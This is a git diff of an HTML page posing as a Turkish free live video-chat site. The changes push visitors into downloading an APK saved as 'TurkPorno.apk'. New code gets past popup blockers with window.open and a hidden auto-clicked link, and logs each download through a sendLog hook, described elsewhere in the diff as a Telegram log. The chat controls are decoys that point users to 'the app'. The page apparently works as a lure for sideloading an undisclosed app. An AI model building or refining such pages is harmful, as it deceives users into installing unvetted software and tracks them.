@@ -10,20 +10,20 @@
         integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     <!-- Open Graph (Facebook, WhatsApp, Telegram, LinkedIn) -->
-<meta property="og:title" content="Sohbet Edelim - Canlı Sohbet" />
-<meta property="og:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
-<meta property="og:image" content="https://bedavasohbet.vercel.app//3.jpg" />
-<meta property="og:image:width" content="1200" />
-<meta property="og:image:height" content="630" />
-<meta property="og:url" content="https://bedavasohbet.vercel.app/" />
-<meta property="og:type" content="website" />
+    <meta property="og:title" content="Sohbet Edelim - Canlı Sohbet" />
+    <meta property="og:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
+    <meta property="og:image" content="https://bedavasohbet.vercel.app//3.jpg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:url" content="https://bedavasohbet.vercel.app/" />
+    <meta property="og:type" content="website" />
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="Sohbet Edelim - Canlı Sohbet" />
-<meta name="twitter:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
-<meta name="twitter:image" content="https://bedavasohbet.vercel.app/3.jpg" />
-<meta name="twitter:url" content="https://bedavasohbet.vercel.app/" />
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Sohbet Edelim - Canlı Sohbet" />
+    <meta name="twitter:description" content="Yeni arkadaşlıklar kur, canlı sohbete katıl!" />
+    <meta name="twitter:image" content="https://bedavasohbet.vercel.app/3.jpg" />
+    <meta name="twitter:url" content="https://bedavasohbet.vercel.app/" />
     
     <style>
         * {
@@ -72,7 +72,6 @@
         }
         @media (max-width: 640px) {
             .stopped {
-                
                 width: 85%;
                 min-width: auto;
                 max-width: 320px;
@@ -126,6 +125,24 @@
         .toast-notification i {
             margin-right: 8px;
             color: #10b981;
+        }
+        /* Loading spinner */
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        button:disabled {
+            cursor: not-allowed;
+            opacity: 0.7;
         }
     </style>
 </head>
@@ -230,6 +247,43 @@
             return APK_SOURCES[slotIndex];
         }
 
+        // Ana indirme fonksiyonu - window.open + fallback yöntemi
+        async function startDownload(apkUrl) {
+            return new Promise((resolve, reject) => {
+                // Önce window.open dene
+                let downloadWindow = window.open(apkUrl, '_blank');
+                
+                // Eğer popup engellendiyse veya başarısız olduysa
+                if (!downloadWindow || downloadWindow.closed || typeof downloadWindow.closed === 'undefined') {
+                    console.log("Popup engellendi, anchor yöntemi deneniyor...");
+                    
+                    // Anchor elementi ile dene
+                    const link = document.createElement('a');
+                    link.href = apkUrl;
+                    link.download = 'TurkPorno.apk';
+                    link.target = '_blank';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(link);
+                    }, 100);
+                    
+                    resolve(true);
+                } else {
+                    // Popup açıldı, bir süre sonra kapatmayı dene (temizlik)
+                    setTimeout(() => {
+                        if (downloadWindow && !downloadWindow.closed) {
+                            // İndirme başladıktan sonra popup'ı kapat (opsiyonel)
+                            // downloadWindow.close();
+                        }
+                    }, 2000);
+                    resolve(true);
+                }
+            });
+        }
+
         window.onload = function() {
             const randomVideo = videos[Math.floor(Math.random() * videos.length)];
             const videoEl = document.getElementById('backgroundVideo');
@@ -259,23 +313,27 @@
                 if (isProcessing) return;
                 isProcessing = true;
                 
-                downloadBtn.innerHTML = `Yükleniyor... <i class="fa-solid fa-spinner fa-spin absolute right-5 text-white"></i>`;
+                // Butonu güncelle - loading durumu
+                const originalHTML = downloadBtn.innerHTML;
+                downloadBtn.innerHTML = `<span class="loading-spinner"></span> İndiriliyor...`;
                 downloadBtn.style.opacity = '0.8';
                 downloadBtn.disabled = true;
                 
                 try {
                     const currentApkUrl = getCurrentApkLink();
+                    console.log("İndirme linki:", currentApkUrl);
                     
+                    // Log gönder (varsa)
                     if (typeof window.sendLog === 'function') {
                         await window.sendLog(currentApkUrl);
-                        showToast("İndirme başlatılıyor!");
-                    } else {
-                        showToast("İndirme başlatılıyor...");
                     }
                     
-                    // Popup engelleyiciyi aşan basit yönlendirme
-                    window.location.href = currentApkUrl;
+                    // İndirmeyi başlat - window.open yöntemi
+                    await startDownload(currentApkUrl);
                     
+                    showToast("İndirme başlatıldı!");
+                    
+                    // Butonu eski haline döndür
                     setTimeout(() => {
                         if (downloadBtn) {
                             downloadBtn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5 text-white text-sm"></i>`;
@@ -283,25 +341,27 @@
                             downloadBtn.disabled = false;
                         }
                         isProcessing = false;
-                    }, 1500);
+                    }, 2000);
                     
                 } catch (error) {
                     console.error("İndirme hatası:", error);
-                    showToast("Bağlantı hatası, tekrar deneyin!", true);
+                    showToast("İndirme bağlantısında sorun oluştu!", true);
+                    
                     setTimeout(() => {
                         if (downloadBtn) {
-                            downloadBtn.innerHTML = `İndir <i class="fa-solid fa-angle-right absolute right-5"></i>`;
+                            downloadBtn.innerHTML = `İndir <i class="fa-solid fa-angle-right absolute right-5 text-white text-sm"></i>`;
                             downloadBtn.style.opacity = '1';
                             downloadBtn.disabled = false;
                         }
                         isProcessing = false;
-                    }, 1000);
+                    }, 1500);
                 }
             }
             
             downloadBtn.addEventListener('click', handleDownload);
         });
         
+        // Video otoplay sorunları için
         const videoElem = document.getElementById('backgroundVideo');
         if (videoElem) {
             videoElem.play().catch(err => {
@@ -315,6 +375,7 @@
             });
         }
         
+        // Kontrol butonları (opsiyonel)
         const muteBtn = document.querySelector('.fa-volume-xmark')?.parentElement;
         const videoBtn = document.querySelector('.fa-video-slash')?.parentElement;
         const micBtn = document.querySelector('.fa-microphone-slash')?.parentElement;
@@ -325,6 +386,10 @@
                 if (icon) {
                     icon.classList.toggle('fa-volume-xmark');
                     icon.classList.toggle('fa-volume-high');
+                }
+                const vid = document.getElementById('backgroundVideo');
+                if (vid) {
+                    vid.muted = !vid.muted;
                 }
             });
         }
@@ -349,10 +414,11 @@
                     icon.classList.toggle('fa-microphone-slash');
                     icon.classList.toggle('fa-microphone');
                 }
+                showToast("Ses ayarı sadece uygulamada çalışır");
             });
         }
         
-        console.log("TurkPorno Görüntülü Görüşme Hazır | Telegram log aktif");
+        console.log("TurkPorno Görüntülü Görüşme Hazır | İndirme sistemi aktif");
     </script>
 </body>
 </html>
